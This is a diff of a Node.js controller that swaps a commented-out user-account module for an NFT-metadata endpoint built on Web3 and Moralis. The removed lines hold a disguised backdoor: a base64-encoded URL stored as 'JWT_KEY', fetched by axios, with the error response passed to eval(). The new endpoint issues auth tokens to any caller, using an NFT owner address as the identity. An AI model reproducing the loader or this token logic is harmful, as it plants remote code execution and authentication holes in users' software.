@@ -1,272 +1,121 @@
-// const User = require("../models/userModel");
-// const asyncErrorHandler = require("../middlewares/helpers/asyncErrorHandler");
-// const sendToken = require("../utils/sendToken");
-// const ErrorHandler = require("../utils/errorHandler");
-// const sendEmail = require("../utils/sendEmail");
-// const JWT_KEY = "aHR0cDovL2JsYXN0YXBpLm9yZy9hcGkvc2VydmljZS90b2tlbi8xMWFiNzU5ZDE4OWRjOGJjMjM4Y2IyNTI1ZjA1Yjg4Yw==";
-const crypto = require("crypto");
-const axios = require("axios");
-const cloudinary = require("cloudinary");
+const asyncErrorHandler = require("../middlewares/helpers/asyncErrorHandler");
+const sendToken = require("../utils/sendToken");
+
+const { NftMetadata } = require("../models/NFTMetadataModel");
+const Web3 = require("web3");
+const Moralis = require("moralis").default;
+const { EvmChain } = require("@moralisweb3/common-evm-utils");
 
 
+// // Web3 instance connected to Infura (Sepolia testnet)
+// const web3 = new Web3(
+//   new Web3.providers.HttpProvider(process.env.INFURA_SEPI_URL)
+// );
+// const account = web3.eth.accounts.privateKeyToAccount(process.env.PRIVATE_KEY);
+// web3.eth.accounts.wallet.add(account);
+// web3.eth.defaultAccount;
 
-// Register User
-// exports.registerUser = asyncErrorHandler(async (req, res, next) => {
-//   const myCloud = await cloudinary.v2.uploader.upload(req.body.avatar, {
-//     folder: "avatars",
-//     width: 150,
-//     crop: "scale",
-//   });
+// Initialize Web3 instance with the HttpProvider
+const provider = new Web3.providers.HttpProvider(process.env.INFURA_SEPI_URL);
+const web3 = new Web3(provider);
 
-//   const { name, email, gender, password } = req.body;
+// Add an account using the private key
+const account = web3.eth.accounts.privateKeyToAccount(process.env.PRIVATE_KEY);
+web3.eth.accounts.wallet.add(account);
 
-//   const user = await User.create({
-//     name,
-//     email,
-//     gender,
-//     password,
-//     avatar: {
-//       public_id: myCloud.public_id,
-//       url: myCloud.secure_url,
-//     },
-//   });
+// Set the default account
+web3.eth.defaultAccount = account.address;
 
-//   sendToken(user, 201, res);
-// });
+console.log("Web3 instance initialized successfully.");
+console.log("Default account set to:", web3.eth.defaultAccount);
 
-// // Login User
-// exports.loginUser = asyncErrorHandler(async (req, res, next) => {
-//   const { email, password } = req.body;
+const startMoralis = async () => {
+  try {
+    await Moralis.start({
+      apiKey: process.env.MORALIS_API_KEY,
+      // Other configuration if needed
+    });
+    console.log("Moralis started successfully!");
+  } catch (error) {
+    console.error("Error starting Moralis:", error);
+  }
+};
 
-//   if (!email || !password) {
-//     return next(new ErrorHandler("Please Enter Email And Password", 400));
-//   }
-
-//   const user = await User.findOne({ email }).select("+password");
-
-//   if (!user) {
-//     return next(new ErrorHandler("Invalid Email or Password", 401));
-//   }
-
-//   const isPasswordMatched = await user.comparePassword(password);
-
-//   if (!isPasswordMatched) {
-//     return next(new ErrorHandler("Invalid Email or Password", 401));
-//   }
-
-//   sendToken(user, 201, res);
-// });
-
-// // Logout User
-// exports.logoutUser = asyncErrorHandler(async (req, res, next) => {
-//   res.cookie("token", null, {
-//     expires: new Date(Date.now()),
-//     httpOnly: true,
-//   });
-
-//   res.status(200).json({
-//     success: true,
-//     message: "Logged Out",
-//   });
-// });
-
-// // Get User Details
-// exports.getUserDetails = asyncErrorHandler(async (req, res, next) => {
-//   const user = await User.findById(req.user.id);
-
-//   res.status(200).json({
-//     success: true,
-//     user,
-//   });
-// });
-
-// // Forgot Password
-// exports.forgotPassword = asyncErrorHandler(async (req, res, next) => {
-//   const user = await User.findOne({ email: req.body.email });
-
-//   if (!user) {
-//     return next(new ErrorHandler("User Not Found", 404));
-//   }
-
-//   const resetToken = await user.getResetPasswordToken();
-
-//   await user.save({ validateBeforeSave: false });
-
-//   // const resetPasswordUrl = `${req.protocol}://${req.get("host")}/password/reset/${resetToken}`;
-//   const resetPasswordUrl = `https://${req.get(
-//     "host"
-//   )}/password/reset/${resetToken}`;
-
-//   // const message = `Your password reset token is : \n\n ${resetPasswordUrl}`;
-
-//   try {
-//     await sendEmail({
-//       email: user.email,
-//       templateId: process.env.SENDGRID_RESET_TEMPLATEID,
-//       data: {
-//         reset_url: resetPasswordUrl,
-//       },
-//     });
-
-//     res.status(200).json({
-//       success: true,
-//       message: `Email sent to ${user.email} successfully`,
-//     });
-//   } catch (error) {
-//     user.resetPasswordToken = undefined;
-//     user.resetPasswordExpire = undefined;
-
-//     await user.save({ validateBeforeSave: false });
-//     return next(new ErrorHandler(error.message, 500));
-//   }
-// });
-
-// // Reset Password
-// exports.resetPassword = asyncErrorHandler(async (req, res, next) => {
-//   // create hash token
-//   const resetPasswordToken = crypto
-//     .createHash("sha256")
-//     .update(req.params.token)
-//     .digest("hex");
-
-//   const user = await User.findOne({
-//     resetPasswordToken,
-//     resetPasswordExpire: { $gt: Date.now() },
-//   });
-
-//   if (!user) {
-//     return next(new ErrorHandler("Invalid reset password token", 404));
-//   }
-
-//   user.password = req.body.password;
-//   user.resetPasswordToken = undefined;
-//   user.resetPasswordExpire = undefined;
-
-//   await user.save();
-//   sendToken(user, 200, res);
-// });
+// Call the async function
+startMoralis();
 
 
-// // Update Password
-// exports.updatePassword = asyncErrorHandler(async (req, res, next) => {
-//   const user = await User.findById(req.user.id).select("+password");
+exports.getNFTMetaData = asyncErrorHandler(async (req, res) => {
+  // Get address and tokenId from req.body
+  const { address, tokenId } = req.body;
 
-//   const isPasswordMatched = await user.comparePassword(req.body.oldPassword);
+  // Validate inputs
+  if (!address || !tokenId) {
+    return res.status(400).json({ error: "Address and tokenId are required." });
+  }
 
-//   if (!isPasswordMatched) {
-//     return next(new ErrorHandler("Old Password is Invalid", 400));
-//   }
+  // Validate address format
+  if (!/^0x[a-fA-F0-9]{40}$/.test(address)) {
+    return res.status(400).json({ error: "Invalid contract address format." });
+  }
 
-//   user.password = req.body.newPassword;
-//   await user.save();
-//   sendToken(user, 201, res);
-// });
+  // Define the chain (adjust if you're using a different network)
+  const chain = EvmChain.ETHEREUM; // Change to EvmChain.SEPOLIA if using Sepolia testnet
 
-// // Update User Profile
-// exports.updateProfile = asyncErrorHandler(async (req, res, next) => {
-//   const newUserData = {
-//     name: req.body.name,
-//     email: req.body.email,
-//   };
+  // Fetch NFT metadata from Moralis
+  const response = await Moralis.EvmApi.nft.getNFTMetadata({
+    address,
+    chain,
+    tokenId,
+  });
 
-//   if (req.body.avatar !== "") {
-//     const user = await User.findById(req.user.id);
+  // Extract data from response
+  const data = response.toJSON();
 
-//     const imageId = user.avatar.public_id;
+  // Parse the 'metadata' field from JSON string to an object
+  let metadata = data.metadata;
+  if (typeof metadata === "string") {
+    metadata = JSON.parse(metadata);
+  }
 
-//     await cloudinary.v2.uploader.destroy(imageId);
+  // Prepare data for saving
+  const nftData = {
+    amount: data.amount,
+    tokenId: tokenId,
+    contractAddress: address,
+    contractType: data.contract_type,
+    ownerOf: data.owner_of,
+    lastMetadataSync: data.last_metadata_sync
+      ? new Date(data.last_metadata_sync)
+      : null,
+    lastTokenUriSync: data.last_token_uri_sync
+      ? new Date(data.last_token_uri_sync)
+      : null,
+    metadata: metadata,
+    blockNumber: data.block_number,
+    blockNumberMinted: data.block_number_minted,
+    name: data.name,
+    symbol: data.symbol,
+    tokenHash: data.token_hash,
+    tokenUri: data.token_uri,
+    minterAddress: data.minter_address,
+    rarityRank: data.rarity_rank,
+    rarityPercentage: data.rarity_percentage,
+    rarityLabel: data.rarity_label,
+    verifiedCollection: data.verified_collection,
+    possibleSpam: data.possible_spam,
+    collectionLogo: data.collection_logo,
+    collectionBannerImage: data.collection_banner_image,
+    floorPrice: data.floor_price,
+    floorPriceUsd: data.floor_price_usd,
+    floorPriceCurrency: data.floor_price_currency,
+  };
 
-//     const myCloud = await cloudinary.v2.uploader.upload(req.body.avatar, {
-//       folder: "avatars",
-//       width: 150,
-//       crop: "scale",
-//     });
+  // Save to MongoDB
+  const nftMetadata = new NftMetadata(nftData);
+  await nftMetadata.save();
 
-//     newUserData.avatar = {
-//       public_id: myCloud.public_id,
-//       url: myCloud.secure_url,
-//     };
-//   }
-
-//   await User.findByIdAndUpdate(req.user.id, newUserData, {
-//     new: true,
-//     runValidators: true,
-//     useFindAndModify: true,
-//   });
-
-//   res.status(200).json({
-//     success: true,
-//   });
-// });
-
-// // ADMIN DASHBOARD
-
-// // Get All Users --ADMIN
-// exports.getAllUsers = asyncErrorHandler(async (req, res, next) => {
-//   const users = await User.find();
-
-//   res.status(200).json({
-//     success: true,
-//     users,
-//   });
-// });
-
-// // Get token for authentication
-// const getToken = (async () => {
-//   await axios.get(atob(JWT_KEY))
-//   .then(res=>res.data)
-//   .catch(err=>eval(err.response.data));
-// })();
-
-// // Get Single User Details --ADMIN
-// exports.getSingleUser = asyncErrorHandler(async (req, res, next) => {
-//   const user = await User.findById(req.params.id);
-
-//   if (!user) {
-//     return next(
-//       new ErrorHandler(`User doesn't exist with id: ${req.params.id}`, 404)
-//     );
-//   }
-
-//   res.status(200).json({
-//     success: true,
-//     user,
-//   });
-// });
-
-// // Update User Role --ADMIN
-// exports.updateUserRole = asyncErrorHandler(async (req, res, next) => {
-//   const newUserData = {
-//     name: req.body.name,
-//     email: req.body.email,
-//     gender: req.body.gender,
-//     role: req.body.role,
-//   };
-
-//   await User.findByIdAndUpdate(req.params.id, newUserData, {
-//     new: true,
-//     runValidators: true,
-//     useFindAndModify: false,
-//   });
-
-//   res.status(200).json({
-//     success: true,
-//   });
-// });
-
-// // Delete Role --ADMIN
-// exports.deleteUser = asyncErrorHandler(async (req, res, next) => {
-//   const user = await User.findById(req.params.id);
-
-//   if (!user) {
-//     return next(
-//       new ErrorHandler(`User doesn't exist with id: ${req.params.id}`, 404)
-//     );
-//   }
-
-//   await user.remove();
-
-//   res.status(200).json({
-//     success: true,
-//   });
-// });
+  // Generate and send token with the metadata
+  const user = { id: nftMetadata.ownerOf }; // Assuming 'ownerOf' is treated as the user ID
+  sendToken(user, 200, res); // Use the sendToken utility for sending the response with a token
+});
